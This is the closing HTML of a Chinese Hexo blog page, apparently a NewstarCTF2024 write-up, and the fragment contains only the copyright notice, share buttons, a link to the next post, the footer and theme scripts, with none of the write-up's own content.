+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://robe1t.github.io">robe1t</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://robe1t.github.io/2024/11/19/NewstarCTF2024-wp/">https://robe1t.github.io/2024/11/19/NewstarCTF2024-wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://robe1t.github.io" target="_blank">welcome2小神龙俱乐部</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/me.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/11/19/SHCTF2024-wp/" title="SHCTF2024 wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SHCTF2024 wp</div></div></a></div></nav></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2020 - 2024 By robe1t</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
